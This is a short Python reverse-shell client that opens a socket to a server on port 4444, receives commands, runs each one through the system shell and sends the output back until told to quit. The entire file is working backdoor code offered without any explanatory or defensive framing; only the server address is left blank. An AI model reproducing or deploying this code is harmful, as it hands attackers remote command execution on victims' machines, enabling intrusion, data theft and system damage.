import sys
import socket
import subprocess

Server = ""
Port = 4444

s = socket.socket()
s.connect((Server, Port))
msg = s.recv(1024).decode()
print(f'[*] Server: {msg}')

while True:
  cmd = s.recv(1024).decode()
  print(f' Recieved Command: {cmd}')
  if cmd.lower() in ['q', 'quit', 'exit', 'x']:
    break

  try:
    result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
  except Exception as e:
    result = str(e).encode()

  if len(result) == 0:
    result = '[+] Executed Successfully'.encode()
  s.send(result)

s.close()
